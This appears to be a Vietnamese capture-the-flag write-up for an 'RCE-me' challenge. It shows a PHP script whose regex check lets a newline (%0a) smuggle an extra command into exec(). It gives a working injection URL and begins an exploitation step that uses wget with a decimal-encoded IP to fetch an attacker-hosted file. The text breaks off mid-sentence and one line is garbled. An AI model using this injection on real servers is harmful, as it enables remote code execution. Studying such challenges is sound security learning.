# RCE-me

```php
 <?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
```

một số điểm cần chú ý:
1. Đoạn code trên thực hiện lệnh bằng cách preg_match rất phổ thông

2. Tiền tố /bin/orange

Bài này chúng ta sẽ lợi dụng vấn đề trong biểu thức chính quy để khai thác. Biểu thức chính quy trong đoạn code trên vẫn có thể khớp khi cuối chuỗi là ký tự xuống dòng (%0a). Vì vậy, các lệnh có thể được thực thi bằng cách sử dụng ký tự xuống dòng.
/^\w+$\$http://ip/args[]=xxx%0a&args[]=touch&args[]=test

Bạn có thể tìm hiểu thêm về: PHP can execute uncompressed packaged PHP files in Linux

bạn có thể tạo một kiểm tra đơn giản bằng cách truy cập:
http://192.168.158.135/?args[]=xxx%0a&args[]=touch&args[]=test

Các tham số trong args là xxx\n、touch、test, cả ba tham số đều có thể vượt qua kiểm tra của preg_match() Lúc này, lệnh được thực thi trong exec là:
> /bin/orange xxx
> touch test

Khai thác:
1. sử dụng wget để tải xuống file
địa chri IP thông thường a.b.c.d, nhưng địa chỉ IP có thể được biểu thị bằng số thập phân . Vì vậy, chúng ta có thể tải xuống bất kỳ tệp nào.
Tiếp theo, chúng ta xây dựng một dịch vụ web cục bộ index.php, viết nó 